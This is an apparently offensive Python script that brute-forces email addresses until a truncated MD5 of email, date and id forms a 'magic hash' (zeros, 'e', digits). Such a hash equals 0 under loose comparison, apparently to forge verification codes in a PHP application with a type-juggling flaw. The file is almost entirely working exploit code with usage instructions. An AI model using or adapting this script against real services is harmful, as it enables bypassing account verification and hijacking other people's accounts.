#!/usr/bin/python3
import hashlib,string,itertools,re,sys
import requests
import urllib3
import os
import sys
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 3

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

def gen_code(domain, id, date, prefix_length):
    count = 0
    for word in itertools.product(string.ascii_lowercase,repeat=int(prefix_length)):
        str_to_hash = ''.join(word) + "@" + domain + date + id
        hash = hashlib.md5(str_to_hash.encode()).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print("[+] Found a valid email! " + ''.join(word) + "@" + domain)
            print("[+] Requests made: " + str(count))
            print("[+] Equivalent loose comparison: " + hash + " == 0\n")
        count += 1

def main():
    if len(sys.argv) !=5:
        print("[+] Usage: " + sys.argv[0] + " <domain_name> <id> <creation_date> <prefix_length>")
        print("[+] Eg: " + sys.argv[0] + " mailserver.local 3 '2018-06-11 22:59:59' 3")
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefix_length = sys.argv[4]
    creation_date = sys.argv[3]

    gen_code(domain, id, creation_date, prefix_length)

if __name__ == "__main__":
    main()

